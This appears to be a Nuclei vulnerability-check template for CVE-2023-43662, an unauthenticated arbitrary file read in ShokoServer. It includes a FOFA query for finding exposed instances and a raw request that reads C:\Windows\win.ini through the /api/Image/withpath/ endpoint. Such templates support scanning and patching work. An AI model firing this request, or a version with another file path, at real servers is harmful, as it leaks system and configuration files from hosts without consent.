id: ShokoServer-api_Image_withpath-File-reading

info:
  name: ShokoServer /api/Image/withpath/ 任意文件读取漏洞(CVE-2023-43662)
  author: unknown
  severity: high
  description: |-
    fofa: title="Shoko WEB UI"
    ShokoServer /api/Image/withpath/接口处存在任意文件读取漏洞，未经身份验证得攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
  reference:
    - https://blog.csdn.net/m0_60571842/article/details/139815106
  tags: File reading

http:
  - raw:
      - |
        GET /api/Image/withpath/C:\Windows\win.ini HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '; for 16-bit app support'
      - type: status
        status: 
          - 200